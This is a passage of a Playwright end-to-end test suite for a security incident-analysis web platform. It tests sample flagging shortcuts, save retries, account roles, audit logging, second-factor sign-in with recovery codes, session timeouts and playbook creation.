  expect((await gone.json()).detail).toContain('"e2e_customer" is not a field of incidents')
  await page.goto(before)
  await expect(page.locator('nav[aria-label="Analysis tabs"]')).toBeVisible()
})

test('keyboard shortcuts: F flags the row under the pointer, C comments, ? lists them', async () => {
  await openEvidence('Malware Analysis')
  const sample = page.getByRole('list', { name: 'Samples' }).locator('li', { hasText: 'dropper.bin' })
  const flag = sample.getByLabel('Flagged')
  // The tab may have just been drawn: read the flag once the sample is there.
  await expect(sample).toBeVisible()
  const before = await flag.count()

  // F toggles the flag of the row under the pointer, as its menu would.
  await sample.hover()
  await page.keyboard.press('f')
  await expect(flag).toHaveCount(before ? 0 : 1)
  await expect(page.getByText(before ? 'Flag removed: dropper.bin' : 'Flagged: dropper.bin')).toBeVisible()
  await page.keyboard.press('f')
  await expect(flag).toHaveCount(before)

  // C asks for the comment.
  await page.keyboard.press('c')
  const comment = page.getByRole('dialog', { name: 'Comment on the sample' })
  await expect(comment).toBeVisible()
  // Typing in a field is typing: no shortcut runs.
  await comment.getByRole('textbox').fill('fc?')
  await expect(comment.getByRole('textbox')).toHaveValue('fc?')
  // Escape with something written asks before it throws it away.
  await page.keyboard.press('Escape')
  await page
    .getByRole('dialog', { name: 'Leave without saving?' })
    .getByRole('button', { name: 'Leave without saving' })
    .click()
  await expect(comment).toHaveCount(0)
  await expect(flag).toHaveCount(before)

  // The menu shows the keys; "?" and the header button list every shortcut.
  await sample.click({ button: 'right' })
  await expect(page.getByRole('menuitem', { name: /flag/i }).first()).toContainText('F')
  await page.keyboard.press('Escape')
  await page.keyboard.press('?')
  const help = page.getByRole('dialog', { name: 'Keyboard shortcuts' })
  await expect(help).toContainText('Flag the row under the pointer')
  await page.keyboard.press('Escape')
  await expect(help).toHaveCount(0)
  await page.getByRole('button', { name: 'Keyboard shortcuts' }).click()
  await expect(help).toBeVisible()
  await page.keyboard.press('Escape')

  // Nothing to flag under the pointer: said, not guessed.
  await page.getByRole('banner').hover()
  await page.keyboard.press('f')
  await expect(page.getByText('Nothing to flag under the pointer.')).toBeVisible()
})

test("saves are retried, merged with a colleague's, resumed after the session expires; a removed flag comes back", async () => {
  const incidentId = decodeURIComponent(new URL(page.url()).pathname.split('/incident/')[1] ?? '')
  expect(incidentId).not.toBe('')
  const stored = async () => (await page.request.get(`/api/incidents/${incidentId}`)).json()
  const storedFlags = async () => Object.keys((await stored()).flags ?? {}).length
  const sample = page.getByRole('list', { name: 'Samples' }).locator('li', { hasText: 'dropper.bin' })
  const flag = sample.getByLabel('Flagged')
  const toggle = async () => {
    await sample.hover()
    await page.keyboard.press('f')
  }
  const failSaves = (route) => (route.request().method() === 'PATCH' ? route.abort() : route.fallback())
  const unsaved = page.getByRole('alert').filter({ hasText: 'Changes not saved yet' })
  const before = await flag.count()
  const flagsBefore = await storedFlags()
  const other = before ? flagsBefore - 1 : flagsBefore + 1

  // A save that fails is said, kept, and sent when asked again.
  await page.route('**/api/incidents/*', failSaves)
  await toggle()
  await expect(flag).toHaveCount(before ? 0 : 1)
  await expect(unsaved).toBeVisible()
  expect(await storedFlags()).toBe(flagsBefore)
  await page.unroute('**/api/incidents/*', failSaves)
  await unsaved.getByRole('button', { name: 'Retry now' }).click()
  await expect(unsaved).toHaveCount(0)
  await expect.poll(storedFlags).toBe(other)

  // A colleague writes to the same incident meanwhile: both changes are kept.
  const note = await page.request.post(`/api/incidents/${incidentId}/notes`, {
    data: { text: 'note from a colleague' },
  })
  expect(note.status()).toBe(201)
  await toggle()
  await expect(flag).toHaveCount(before)
  await expect.poll(storedFlags).toBe(flagsBefore)
  expect((await stored()).notes.map((item) => item.text)).toContain('note from a colleague')

  // The session ends with a change still to save: signing in again saves it.
  await page.route('**/api/incidents/*', failSaves)
  await toggle()
  await expect(unsaved).toBeVisible()
  await page.request.post('/api/auth/logout')
  await page.unroute('**/api/incidents/*', failSaves)
  await unsaved
    .getByRole('button', { name: 'Retry now' })
    .click({ timeout: 2000 })
    .catch(() => {})
  const expired = page.getByRole('dialog', { name: 'Session expired' })
  await expect(expired).toContainText('not saved yet')
  await expired.getByLabel('Password of admin').fill(ADMIN.password)
  await expired.getByRole('button', { name: 'Sign in again' }).click()
  await expect(expired).toHaveCount(0)
  await expect.poll(storedFlags).toBe(other)
  await expect(unsaved).toHaveCount(0)

  // Removing a flag can be undone.
  if (!(await flag.count())) await toggle()
  await expect(flag).toHaveCount(1)
  await toggle()
  await expect(flag).toHaveCount(0)
  await page.getByRole('button', { name: 'Undo' }).last().click()
  await expect(flag).toHaveCount(1)
  if (!before) {
    await toggle()
    await expect(flag).toHaveCount(0)
  }
  await expect.poll(storedFlags).toBe(flagsBefore)
})

test('an admin manages accounts; the audit log is written by the server', async ({ browser }) => {
  await page.getByRole('button', { name: 'Platform settings' }).click()
  const settings = page.getByRole('region', { name: 'Settings' })
  const sections = settings.getByRole('navigation', { name: 'Settings sections' })
  await sections.getByText('Accounts').click()

  // A new analyst, then renamed, promoted and given another password from the pencil.
  await settings.locator('#add-username').fill('anna')
  await settings.locator('#add-password').fill('first-secret')
  await settings.getByRole('button', { name: 'Add user' }).click()
  const accounts = settings.getByRole('list', { name: 'Accounts' })
  const anna = accounts.getByRole('listitem').filter({ hasText: 'anna' })
  await expect(anna).toContainText('Analyst')
  await anna.getByRole('button', { name: 'Edit user anna' }).click()
  const edit = page.getByRole('dialog', { name: 'Account: anna' })
  await edit.locator('#edit-username').fill('anna.b')
  await edit.getByRole('checkbox', { name: /^Admin/ }).check()
  await edit.locator('#edit-password').fill('second-secret')
  await edit.getByRole('button', { name: 'Save changes' }).click()
  await expect(edit).toHaveCount(0)
  const renamed = accounts.getByRole('listitem').filter({ hasText: 'anna.b' })
  // Roles add up: the account is an analyst and an admin.
  await expect(renamed.getByLabel('Roles')).toHaveText('AnalystAdmin')

  // The account signs in with its new name and password, and changes its own password.
  const other = await browser.newPage()
  await other.goto('/')
  await other.fill('#login-username', 'anna.b')
  await other.fill('#login-password', 'second-secret')
  await other.click('button[type=submit]')
  await other.getByRole('button', { name: 'Platform settings' }).click()
  const theirs = other.getByRole('region', { name: 'Settings' })
  await theirs.getByRole('navigation', { name: 'Settings sections' }).getByText('My account').click()
  await theirs.locator('#own-current-password').fill('second-secret')
  await theirs.locator('#own-new-password').fill('third-secret')
  await theirs.locator('#own-confirm-password').fill('third-secret')
  await theirs.getByRole('button', { name: 'Change password' }).click()
  await expect(theirs.getByRole('status')).toContainText('Password changed')

  // Disabled by the admin: the open session is over at its next request.
  await renamed.getByRole('button', { name: 'Edit user anna.b' }).click()
  const again = page.getByRole('dialog', { name: 'Account: anna.b' })
  await again.getByRole('checkbox', { name: /^Disabled/ }).check()
  await again.getByRole('button', { name: 'Save changes' }).click()
  await expect(renamed).toContainText('Disabled')
  await theirs.getByRole('navigation', { name: 'Settings sections' }).getByText('Audit log').click()
  await expect(other.getByRole('dialog', { name: 'Session expired' })).toBeVisible()
  await other.close()

  // The admin cannot lock themselves out.
  await accounts
    .getByRole('listitem')
    .filter({ hasText: 'You' })
    .getByRole('button', { name: /^Edit user/ })
    .click()
  const own = page.getByRole('dialog', { name: `Account: ${ADMIN.username}` })
  await expect(own.getByRole('checkbox', { name: /^Admin/ })).toBeDisabled()
  await expect(own.getByRole('checkbox', { name: /^Analyst/ })).toBeEnabled()
  await expect(own.getByRole('checkbox', { name: /^Disabled/ })).toBeDisabled()
  await own.getByRole('button', { name: 'Cancel' }).click()

  // Everything above is in the audit log, recorded by the server.
  await sections.getByText('Audit log').click()
  for (const text of ['user.create', 'renamed from "anna"', 'password reset', 'user.password', 'disabled']) {
    await expect(settings.getByText(text).first()).toBeVisible()
  }
  // It cannot be written from the browser.
  const forged = await page.request.post('/api/audit', { data: { action: 'incident.delete', details: 'not me' } })
  expect(forged.status()).toBe(400)

  await sections.getByText('Accounts').click()
  await renamed.getByRole('button', { name: 'Delete user anna.b' }).click()
  await expect(renamed).toHaveCount(0)
  await settings.getByRole('button', { name: 'Close settings' }).click()
})

test('roles are tags: an account sees and does what its roles grant together', async ({ browser }) => {
  await page.getByRole('button', { name: 'Platform settings' }).click()
  const settings = page.getByRole('region', { name: 'Settings' })
  const sections = settings.getByRole('navigation', { name: 'Settings sections' })
  await sections.getByText('Accounts').click()
  const accounts = settings.getByRole('list', { name: 'Accounts' })

  // Rita reads and manages the rule sets; Otto reads the audit log and nothing else.
  const add = async (name, roles) => {
    await settings.locator('#add-username').fill(name)
    await settings.locator('#add-password').fill('role-secret')
    for (const role of ['Viewer', 'Analyst', 'Rules', 'Audit', 'Admin']) {
      await settings.locator(`#add-role-${role.toLowerCase()}`).setChecked(roles.includes(role))
    }
    await settings.getByRole('button', { name: 'Add user' }).click()
    await expect(accounts.getByRole('listitem').filter({ hasText: name }).getByLabel('Roles')).toHaveText(
      roles.join(''),
    )
  }
  await add('rita', ['Viewer', 'Rules'])
  await add('otto', ['Audit'])
  // An account needs at least one role.
  await settings.locator('#add-role-analyst').uncheck()
  await expect(settings.getByRole('button', { name: 'Add user' })).toBeDisabled()
  await settings.locator('#add-role-analyst').check()
  await settings.getByRole('button', { name: 'Close settings' }).click()

  const signIn = async (name) => {
    const other = await browser.newPage()
    await other.goto('/')
    await other.fill('#login-username', name)
    await other.fill('#login-password', 'role-secret')
    await other.click('button[type=submit]')
    await expect(other.getByRole('button', { name: 'Platform settings' })).toBeVisible()
    return other
  }

  // A viewer with the rules role: reads the incidents, creates none, manages the rule sets.
  const rita = await signIn('rita')
  const ritaRail = rita.getByRole('navigation', { name: 'Sections' })
  await expect(ritaRail.getByRole('button', { name: /incidents/i })).toBeVisible()
  // The foot of the rail is the same for everyone: no shortcut to a section of Settings.
  await expect(ritaRail.getByRole('button', { name: 'Audit log' })).toHaveCount(0)
  await expect(ritaRail.getByRole('button', { name: 'Users' })).toHaveCount(0)
  await expect(ritaRail.getByRole('button', { name: /^Account: rita/ })).toBeVisible()
  await expect(rita.getByText('read-only', { exact: true })).toBeVisible()
  await expect(rita.getByRole('button', { name: 'New incident' })).toHaveCount(0)
  expect((await rita.request.post('/api/incidents', { data: { id: 'by-rita', data: {} } })).status()).toBe(403)
  await rita.getByRole('button', { name: 'Platform settings' }).click()
  const ritaSections = rita.getByRole('navigation', { name: 'Settings sections' })
  await expect(ritaSections.getByText('YARA rules')).toBeVisible()
  await expect(ritaSections.getByText('Detection rules')).toBeVisible()
  for (const hidden of ['Accounts and roles', 'API keys', 'Audit log', 'Storage', 'Backup', 'Threat intelligence']) {
    await expect(ritaSections.getByText(hidden, { exact: true })).toHaveCount(0)
  }
  await ritaSections.getByText('My account').click()
  await expect(rita.getByRole('region', { name: 'Settings' }).getByLabel('Roles')).toHaveText('ViewerRules')
  const rule = { name: 'by-rita', source: 'rule by_rita { condition: false }', enabled: true }
  const made = await rita.request.post('/api/yara-rules', { data: rule })
  expect(made.status()).toBe(201)
  expect((await rita.request.delete(`/api/yara-rules/${(await made.json()).id}`)).status()).toBe(204)
  await rita.close()

  // The audit role alone: no incidents, no artifacts; the audit log, and one's own account.
  const otto = await signIn('otto')
  await expect(otto.getByText('Nothing to open here')).toBeVisible()
  const ottoRail = otto.getByRole('navigation', { name: 'Sections' })
  await expect(ottoRail.getByRole('button')).toHaveCount(2) // the settings and the account
  await ottoRail.getByRole('button', { name: 'Platform settings' }).click()
  const ottoSettings = otto.getByRole('region', { name: 'Settings' })
  await ottoSettings
    .getByRole('navigation', { name: 'Settings sections' })
    .getByRole('button', { name: 'Audit log' })
    .click()
  await expect(ottoSettings.getByText('user.create').first()).toBeVisible()
  await expect(ottoSettings.getByRole('button', { name: /clear/i })).toHaveCount(0)
  await expect(ottoSettings.getByRole('navigation', { name: 'Settings sections' }).getByRole('button')).toHaveText([
    'My account',
    'Audit log',
  ])
  expect((await otto.request.get('/api/incidents')).status()).toBe(403)
  await otto.close()

  // Leave the accounts as they were.
  await page.getByRole('button', { name: 'Platform settings' }).click()
  await sections.getByText('Accounts').click()
  for (const name of ['rita', 'otto']) {
    await accounts
      .getByRole('listitem')
      .filter({ hasText: name })
      .getByRole('button', { name: `Delete user ${name}` })
      .click()
    await expect(accounts.getByRole('listitem').filter({ hasText: name })).toHaveCount(0)
  }
  await settings.getByRole('button', { name: 'Close settings' }).click()
})

test('a second factor: set up under My account, asked at the sign-in, a wrong code, a recovery code, turned off', async ({
  browser,
}) => {
  test.setTimeout(120_000)
  const created = await page.request.post('/api/users', {
    data: { username: 'tess', password: 'tess-secret', roles: ['analyst'] },
  })
  expect(created.status()).toBe(201)
  expect((await created.json()).user.secondFactor).toBe(false)

  const other = await (await browser.newContext({ acceptDownloads: true })).newPage()
  const signIn = async () => {
    await other.fill('#login-username', 'tess')
    await other.fill('#login-password', 'tess-secret')
    await other.click('button[type=submit]')
  }
  const signOut = async () => {
    await other.getByRole('button', { name: /^Account: tess/ }).click()
    await other.getByRole('menu').getByRole('menuitem', { name: 'Sign out' }).click()
    await expect(other.locator('#login-username')).toBeVisible()
  }
  await other.goto('/')
  await signIn()
  // No second factor yet: the password is the whole sign-in.
  await other.getByRole('button', { name: 'Platform settings' }).click()
  const theirs = other.getByRole('region', { name: 'Settings' })
  await theirs.getByRole('navigation', { name: 'Settings sections' }).getByText('My account').click()

  // Set up: the QR code and the secret, a first code from the "app", then the recovery codes, once.
  await theirs.getByRole('button', { name: 'Set up a second factor…' }).click()
  const setup = other.getByRole('dialog', { name: 'Set up a second factor' })
  await expect(setup.getByRole('img', { name: 'QR code to scan with the authenticator app' })).toBeVisible()
  const secret = (await setup.getByLabel('Secret', { exact: true }).innerText()).replace(/\s/g, '')
  expect(secret).toMatch(/^[A-Z2-7]{32}$/)
  const first = setup.locator('#second-factor-first-code')
  await expect(first).toHaveAttribute('inputmode', 'numeric')
  await expect(first).toHaveAttribute('autocomplete', 'one-time-code')
  await expect(setup.getByRole('button', { name: 'Turn it on' })).toBeDisabled()
  await first.fill('000000')
  await setup.getByRole('button', { name: 'Turn it on' }).click()
  await expect(setup.getByRole('alert')).toContainText('That code is not right')
  // Pasted with the space an app shows in it: the field keeps the digits.
  const code = await nextCode(secret)
  await first.fill(`${code.slice(0, 3)} ${code.slice(3)}`)
  await expect(first).toHaveValue(code)
  await setup.getByRole('button', { name: 'Turn it on' }).click()
  await expect(setup.getByText('Your second factor is on.')).toBeVisible()
  const codes = await setup.getByRole('list', { name: 'Recovery codes' }).getByRole('listitem').allTextContents()
  expect(codes).toHaveLength(10)
  expect(codes[0]).toMatch(/^[a-z2-9]{4}(-[a-z2-9]{4}){3}$/)
  // They are shown only now: leaving before they were copied or downloaded asks first.
  await other.keyboard.press('Escape')
  const leaving = other.getByRole('dialog', { name: 'Leave without saving?' })
  await expect(leaving).toContainText('Your recovery codes were neither copied nor downloaded')
  await leaving.getByRole('button', { name: 'Stay', exact: true }).click()
  await expect(setup.getByRole('list', { name: 'Recovery codes' })).toBeVisible()
  const [download] = await Promise.all([
    other.waitForEvent('download'),
    setup.getByRole('button', { name: 'Download' }).click(),
  ])
  expect(download.suggestedFilename()).toBe('nik-recovery-codes-tess.txt')
  await expect(setup.getByRole('status').filter({ hasText: 'Downloaded.' })).toBeVisible()
  await setup.getByRole('button', { name: 'Done' }).click()
  await expect(setup).toHaveCount(0)
  await expect(theirs.getByText('An authenticator app, since')).toBeVisible()
  await expect(theirs.getByText('10 recovery codes left.')).toBeVisible()
  // The session went on under a new id, and is the only one of the account.
  const mine = theirs.getByRole('list', { name: 'Your sessions' }).getByRole('listitem')
  await expect(mine).toHaveCount(1)
  await expect(mine).toContainText('This browser')
  await theirs.getByRole('button', { name: 'Close settings' }).click()

  // Signing in: the password, then the code. A wrong one is refused; the right one is taken.
  await signOut()
  await signIn()
  await expect(other.getByRole('heading', { name: 'second step' })).toBeVisible()
  expect((await other.request.get('/api/auth/me')).status()).toBe(401) // the password alone gave nothing
  await other.locator('#login-code').fill('000000')
  await other.getByRole('button', { name: 'Continue' }).click()
  await expect(other.getByRole('alert')).toContainText('That code is not right')
  await other.locator('#login-code').fill(await nextCode(secret))
  await other.getByRole('button', { name: 'Continue' }).click()
  await expect(other.getByRole('button', { name: 'Platform settings' })).toBeVisible()

  // A recovery code, by its link: it is spent, and the person is told how many are left.
  await signOut()
  await signIn()
  await other.getByRole('button', { name: 'Use a recovery code instead' }).click()
  await other.locator('#login-recovery-code').fill(codes[0])
  await other.getByRole('button', { name: 'Continue' }).click()
  const used = other.getByRole('dialog', { name: 'Recovery code used' })
  await expect(used).toContainText('You have 9 left')
  await used.getByRole('button', { name: 'OK' }).click()

  // Turned off: the password and a code are asked again (here, another recovery code).
  await other.getByRole('button', { name: 'Platform settings' }).click()
  await theirs.getByRole('navigation', { name: 'Settings sections' }).getByText('My account').click()
  await expect(theirs.getByText('9 recovery codes left.')).toBeVisible()
  await theirs.getByRole('button', { name: 'Turn it off…' }).click()
  const off = other.getByRole('dialog', { name: 'Turn the second factor off' })
  await off.locator('#confirm-identity-password').fill('tess-secret')
  await expect(off.getByRole('button', { name: 'Turn it off' })).toBeDisabled()
  await off.getByRole('button', { name: 'Use a recovery code instead' }).click()
  await off.locator('#confirm-identity-recovery').fill(codes[0])
  await off.getByRole('button', { name: 'Turn it off' }).click()
  await expect(off.getByRole('alert')).toContainText('used already')
  await off.locator('#confirm-identity-recovery').fill(codes[1])
  await off.getByRole('button', { name: 'Turn it off' }).click()
  await expect(off).toHaveCount(0)
  await expect(theirs.getByRole('button', { name: 'Set up a second factor…' })).toBeVisible()
  await other.context().close()

  // What happened is in the audit log, failed codes included.
  const entries = (await (await page.request.get('/api/audit?q=tess')).json()).entries.map((entry) => entry.action)
  for (const action of ['auth.factor.on', 'auth.code.failed', 'auth.recovery.used', 'auth.factor.off']) {
    expect(entries).toContain(action)
  }
})

test('a session that is not used warns before it ends, and goes on when asked', async () => {
  test.setTimeout(150_000)
  await page.getByRole('button', { name: 'Platform settings' }).click()
  const settings = page.getByRole('region', { name: 'Settings' })
  await settings.getByRole('navigation', { name: 'Settings sections' }).getByText('Sign-in and sessions').click()
  // Nothing is required of anybody until it is set here, and only administrators can be.
  await expect(settings.getByRole('switch', { name: 'Administrators must have a second factor' })).not.toBeChecked()
  await expect(settings.getByRole('checkbox')).toHaveCount(0)
  await expect(settings.locator('#policy-adminNetworks')).toHaveValue('')
  await expect(settings.getByLabel('Your address as the server sees it')).toHaveText('127.0.0.1')
  const idle = settings.locator('#policy-idleMinutesAdmin')
  // Half an hour for administrators, eight hours for the others.
  await expect(idle).toHaveValue('30')
  await expect(settings.locator('#policy-idleMinutes')).toHaveValue('480')
  const save = settings.getByRole('button', { name: 'Save', exact: true })
  await expect(save).toBeDisabled()
  // A value the server would refuse is said in the form, and cannot be saved.
  await idle.fill('soon')
  await expect(settings.getByText('A whole number from 0 to 10080')).toBeVisible()
  await expect(save).toBeDisabled()
  // The shortest there is: a minute without doing anything, with a warning half a minute before.
  await idle.fill('1')
  await save.click()
  await expect(settings.getByRole('status').filter({ hasText: 'Saved.' })).toBeVisible()

  // Nothing is touched: the lists of the page go on refreshing by themselves, and do not count.
  const warning = page.getByRole('dialog', { name: 'Your session is about to end' })
  await expect(warning).toBeVisible({ timeout: 70_000 })
  await expect(warning).toContainText('Nothing was done here for a while')
  await expect(warning.getByRole('timer')).toHaveText(/^0:\d\d$/)
  expect(
    (await (await page.request.get('/api/auth/session', { headers: { 'X-Nik-Background': '1' } })).json()).idleLeft,
  ).toBeLessThanOrEqual(30)
  await warning.getByRole('button', { name: 'Stay signed in' }).click()
  await expect(warning).toHaveCount(0)

  // Back to what it was, and the session is as good as new.
  await idle.fill('30')
  await save.click()
  await expect(settings.getByRole('status').filter({ hasText: 'Saved.' })).toBeVisible()
  const state = await (await page.request.get('/api/auth/session')).json()
  expect(state.idleSeconds).toBe(30 * 60)
  expect(state.idleLeft).toBeGreaterThan(29 * 60)
  await settings.getByRole('button', { name: 'Close settings' }).click()
})

test('administrators must have a second factor: the one who turns it on sets theirs up at once, another is led to it at the sign-in; sessions are seen and ended, a factor is reset', async ({
  browser,
}) => {
  test.setTimeout(180_000)
  // Tess becomes an administrator; an analyst is there to show that nobody else is concerned.
  const users = (await (await page.request.get('/api/users')).json()).users
  const tessId = users.find((user) => user.username === 'tess').id
  expect((await page.request.patch(`/api/users/${tessId}`, { data: { roles: ['admin'] } })).status()).toBe(200)
  expect(
    (
      await page.request.post('/api/users', {
        data: { username: 'ugo', password: 'ugo-secret', roles: ['analyst', 'rules'] },
      })
    ).status(),
  ).toBe(201)

  await page.getByRole('button', { name: 'Platform settings' }).click()
  const settings = page.getByRole('region', { name: 'Settings' })
  const sections = settings.getByRole('navigation', { name: 'Settings sections' })
  await sections.getByText('Sign-in and sessions').click()
  const required = settings.getByRole('switch', { name: 'Administrators must have a second factor' })
  const save = settings.getByRole('button', { name: 'Save', exact: true })
  await required.click()
  await expect(required).toBeChecked()
  // Who will be asked is said before it is saved: the two administrators, not the analyst.
  const asked = settings.getByRole('status').filter({ hasText: 'will be asked to set one up' })
  await expect(asked).toContainText('2 accounts have none')
  await expect(asked).toContainText('tess')
  await expect(asked).not.toContainText('ugo')
  await expect(asked).toContainText('You are one of them')
  await save.click()

  // The administrator who turned it on is not locked out: their own set-up opens at once, over the page.
  const mine = page.getByRole('dialog', { name: 'Set up your second factor' })
  await expect(mine).toBeVisible()
  expect((await (await page.request.get('/api/users')).json()).code).toBe('second_factor_required')
  // The password is asked first unless the sign-in is of a moment ago (an earlier test signed in again:
  // it may be either here; a test near the end of the suite looks at the question itself).
  const password = mine.locator('#second-factor-password')
  await expect(password.or(mine.getByLabel('Secret', { exact: true }))).toBeVisible()
  if (await password.isVisible()) {
    await password.fill(ADMIN.password)
    await mine.getByRole('button', { name: 'Continue' }).click()
  }
  const adminSecret = (await mine.getByLabel('Secret', { exact: true }).innerText()).replace(/\s/g, '')
  await mine.locator('#second-factor-first-code').fill(await nextCode(adminSecret))
  await mine.getByRole('button', { name: 'Turn it on' }).click()
  await expect(mine.getByRole('list', { name: 'Recovery codes' }).getByRole('listitem')).toHaveCount(10)
  const adminCodes = await mine.getByRole('list', { name: 'Recovery codes' }).getByRole('listitem').allTextContents()
  await Promise.all([page.waitForEvent('download'), mine.getByRole('button', { name: 'Download' }).click()])
  await mine.getByRole('button', { name: 'Go on' }).click()
  await expect(mine).toHaveCount(0)
  expect((await page.request.get('/api/users')).status()).toBe(200)

  await sections.getByText('Accounts').click()
  const accounts = settings.getByRole('list', { name: 'Accounts' })
  const tess = accounts.getByRole('listitem').filter({ hasText: 'tess' })
  await expect(tess).toContainText('Second factor required')
  await expect(accounts.getByRole('listitem').filter({ hasText: 'You' })).not.toContainText('required')
  await expect(accounts.getByRole('listitem').filter({ hasText: 'ugo' })).toContainText('No second factor')

  // An analyst signs in as before: nobody but administrators is required.
  const analyst = await (await browser.newContext()).newPage()
  await analyst.goto('/')
  await analyst.fill('#login-username', 'ugo')
  await analyst.fill('#login-password', 'ugo-secret')
  await analyst.click('button[type=submit]')
  await expect(analyst.getByRole('button', { name: 'Platform settings' })).toBeVisible()
  expect((await analyst.request.get('/api/incidents')).status()).toBe(200)
  await analyst.context().close()

  // The other administrator signs in and lands on the set-up, not on the app: nothing else answers.
  const other = await (await browser.newContext({ acceptDownloads: true })).newPage()
  await other.goto('/')
  await other.fill('#login-username', 'tess')
  await other.fill('#login-password', 'tess-secret')
  await other.click('button[type=submit]')
  await expect(other.getByRole('heading', { name: 'second factor' })).toBeVisible()
  await expect(other.getByText('Administrators must have a second factor')).toBeVisible()
  await expect(other.getByRole('button', { name: 'Platform settings' })).toHaveCount(0)
  const refused = await other.request.get('/api/incidents')
  expect(refused.status()).toBe(403)
  expect((await refused.json()).code).toBe('second_factor_required')
  // The password was given a moment ago: it is not asked twice.
  await expect(other.locator('#second-factor-password')).toHaveCount(0)
  const secret = (await other.getByLabel('Secret', { exact: true }).innerText()).replace(/\s/g, '')
  await other.locator('#second-factor-first-code').fill(await nextCode(secret))
  await other.getByRole('button', { name: 'Turn it on' }).click()
  await expect(other.getByRole('list', { name: 'Recovery codes' }).getByRole('listitem')).toHaveCount(10)
  // Still not the app: it opens when the codes were read.
  await expect(other.getByRole('button', { name: 'Platform settings' })).toHaveCount(0)
  await Promise.all([other.waitForEvent('download'), other.getByRole('button', { name: 'Download' }).click()])
  await other.getByRole('button', { name: 'Open Nik' }).click()
  await expect(other.getByRole('button', { name: 'Platform settings' })).toBeVisible()
  expect((await other.request.get('/api/incidents')).status()).toBe(200)

  // The admin sees it has one now, sees where it is signed in, and ends that session.
  await sections.getByText('My account').click()
  await sections.getByText('Accounts').click()
  await expect(tess).not.toContainText('required')
  await expect(tess).toContainText('Second factor')
  await tess.getByRole('button', { name: 'Sessions of tess' }).click()
  const theirSessions = page.getByRole('dialog', { name: 'Sessions of tess' })
  const open = theirSessions.getByRole('list', { name: 'Sessions of tess' }).getByRole('listitem')
  await expect(open).toHaveCount(1)
  await expect(open).toContainText('Chrome')
  await expect(open).toContainText('127.0.0.1')
  await open.getByRole('button', { name: /^End:/ }).click()
  await expect(theirSessions.getByText('No open session.')).toBeVisible()
  await theirSessions.getByRole('button', { name: 'Close' }).last().click()

  // Ended at once: the next thing the account does asks to sign in again, with the code this time.
  await other.getByRole('button', { name: 'Platform settings' }).click()
  const expired = other.getByRole('dialog', { name: 'Session expired' })
  await expired.getByLabel('Password of tess').fill('tess-secret')
  await expired.getByRole('button', { name: 'Sign in again' }).click()
  await expired.locator('#session-expired-code').fill(await nextCode(secret))
  await expired.getByRole('button', { name: 'Continue' }).click()
  await expect(expired).toHaveCount(0)
  expect((await other.request.get('/api/incidents')).status()).toBe(200)

  // Somebody who lost the device: the admin resets the factor (never their own), and the account sets one up again.
  await expect(
    accounts
      .getByRole('listitem')
      .filter({ hasText: 'You' })
      .getByRole('button', { name: /^Reset the second factor of/ }),
  ).toBeDisabled()
  await tess.getByRole('button', { name: 'Reset the second factor of tess' }).click()
  const reset = page.getByRole('dialog', { name: 'Reset the second factor of tess' })
  await expect(reset).toContainText('asked to set a second factor up again before anything else')
  await reset.getByRole('button', { name: 'Reset it' }).click()
  await expect(reset).toHaveCount(0)
  await expect(tess).toContainText('Second factor required')
  await other.reload()
  await other.fill('#login-username', 'tess')
  await other.fill('#login-password', 'tess-secret')
  await other.click('button[type=submit]')
  await expect(other.getByText('Your second factor was reset, and administrators must have one.')).toBeVisible()
  await other.context().close()

  // Leave things as they were: nothing is required, the two accounts are gone, the admin has no second factor.
  await sections.getByText('Sign-in and sessions').click()
  await required.click()
  await expect(required).not.toBeChecked()
  await save.click()
  await expect(settings.getByRole('status').filter({ hasText: 'Saved.' })).toBeVisible()
  await sections.getByText('Accounts').click()
  for (const name of ['tess', 'ugo']) {
    const row = accounts.getByRole('listitem').filter({ hasText: name })
    await row.getByRole('button', { name: `Delete user ${name}` }).click()
    await expect(row).toHaveCount(0)
  }
  await sections.getByText('My account').click()
  await settings.getByRole('button', { name: 'Turn it off…' }).click()
  const off = page.getByRole('dialog', { name: 'Turn the second factor off' })
  await off.locator('#confirm-identity-password').fill(ADMIN.password)
  await off.getByRole('button', { name: 'Use a recovery code instead' }).click()
  await off.locator('#confirm-identity-recovery').fill(adminCodes[0])
  await off.getByRole('button', { name: 'Turn it off' }).click()
  await expect(off).toHaveCount(0)
  await expect(settings.getByRole('button', { name: 'Set up a second factor…' })).toBeVisible()
  expect((await (await page.request.get('/api/auth/me')).json()).user.secondFactor).toBe(false)
  const said = (await (await page.request.get('/api/audit?q=tess')).json()).entries.map((entry) => entry.action)
  expect(said).toContain('auth.factor.reset')
  expect(said).toContain('auth.session.end')
  await settings.getByRole('button', { name: 'Close settings' }).click()
})

test('a playbook is drawn on the canvas, checked by the server and saved as a version', async () => {
  test.setTimeout(240_000) // a long story, and the runners of CI are slower than a desk
  const before = page.url()
  await page.getByRole('button', { name: 'Automations', exact: true }).click()
  const area = page.getByRole('region', { name: 'Automations' })
  await expect(page).toHaveURL(/\/automation\/playbooks$/)
  // The playbooks Nik ships are there from the first start, off: nothing runs until someone turns one on.
  const shipped = area.getByRole('row').filter({ hasText: 'shipped with Nik' })
  await expect(shipped).toHaveCount(4)
  await expect(shipped.filter({ hasText: 'Phishing triage' })).toHaveCount(1)
  const listed = (await (await page.request.get('/api/automation/playbooks')).json()).playbooks
  expect(listed.filter((playbook) => playbook.enabled)).toEqual([])

  await area.getByRole('button', { name: 'New playbook' }).first().click()
  const create = page.getByRole('dialog', { name: 'New playbook' })
  await create.getByLabel('Name').fill('Note on high')
  await create.getByRole('button', { name: 'Create' }).click()
  await expect(page).toHaveURL(/\/automation\/playbooks\/[0-9a-f]+$/)
  await expect(area.getByRole('heading', { name: 'Note on high' })).toBeVisible()
  await expect(area.getByText('playbook · no version yet')).toBeVisible()

  const canvas = area.getByTestId('playbook-canvas')
  const library = area.getByRole('complementary', { name: 'Node library' })
  const inspector = area.getByRole('complementary', { name: 'Inspector' })
  const nodes = canvas.locator('.react-flow__node')
  await expect(nodes).toHaveCount(1)
  await expect(nodes.first()).toContainText('by hand')

  // The trigger: an event of Nik, besides being run by hand.
  await nodes.first().click()
  await inspector.getByLabel('On an event').selectOption('incident.created')
  await expect(nodes.first()).toContainText('incident.created · by hand')

  // A node added from the library comes after the selected one, joined to it.
  await library.getByLabel('Search nodes').fill('condit')
  await library.getByRole('button', { name: 'Condition', exact: true }).click()
  await library.getByLabel('Search nodes').fill('')
  await expect(nodes).toHaveCount(2)
  await expect(canvas.locator('.react-flow__edge')).toHaveCount(1)
  // "Pick a value" writes the expression; what is typed wrong says where.
  await inspector.getByRole('button', { name: 'Pick a value for Comparison 1: what to compare' }).click()
  await page
    .getByRole('dialog', { name: 'Pick a value' })
